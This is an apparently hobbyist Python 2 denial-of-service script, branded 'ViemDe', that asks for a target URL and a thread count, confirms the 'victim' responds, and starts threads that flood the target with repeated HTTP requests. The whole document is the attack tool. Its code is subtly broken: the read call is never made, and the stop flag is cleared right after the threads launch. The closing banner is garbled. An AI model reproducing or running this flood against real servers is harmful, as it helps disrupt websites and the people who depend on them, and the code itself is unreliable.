#/usr/bin/Python
# -*- coding: utf-8 -*-
import sys
import time
import threading
import urllib

print "\n"*100
print "*******************************************"
print "           -=[#]! ViemDe ![#]=-      \n"
print "      -=[#]! https://www.facebook.com/ViemDe ![#]=-\n"
print "*******************************************"
time.sleep(3)

a=1
b=threading.Lock()

class dos(threading.Thread):
    def __init__(self, host, threads):
        threading.Thread.__init__(self)
        self.host = host
        self.threads = threads
    def run(self):
        global a
        global b
        b.acquire()
        print "\n                          °°° Attaccking °°° {0}".format(self.threads)
        b.release()
        while 1 == a:
            try:
                urllib.urlopen(self.host).read
                try:
                    urllib.urlopen(self.host).read
                except:
                    pass
            except:
                pass
        b.acquire()
        print "                          °°°  Quitting  °°° {0}\n".format(self.threads)
        b.release()
        sys.exit()
try:
    threads=input("             [#]! Threads : ")
except NameError:
    print  "\n-=[#]! Insert Number of Threads ![#]=-\n"
    sys.exit()
while True:
    host=raw_input("\n             [#]! Target  : ")
    print "\n                -=[#]! Check in victim ![#]=-\n"
    time.sleep(2)
    try:
        urllib.urlopen(host)
    except IOError:
        print "\n-=[#]! Connection Error Verify Target ![#]=-\n"
        sys.exit()
    else:
        break
print "\n"*100
print "                    *******************************************"
print "                           -=[#]! ViemDe Dossier ![#]=-     \n"
print "                  [#]! Target : %s        \n"%(host)
print "                           [#]! Threads: %d        \n"%(threads)
print "                    *******************************************"
c=raw_input("                    Is this correct ? ( Y/N ) > ")
if c=="Y":
    pass
elif c=="N":
    print "\n                           OK, Stopping.\n"
    sys.exit()
for A in xrange(threads):
    dos(host, A+1).start()
a=0
print "**************************************************************************************"
print "                      -=[#]! T?n C� ![#]=-     \n"
print "**************************************************************************************"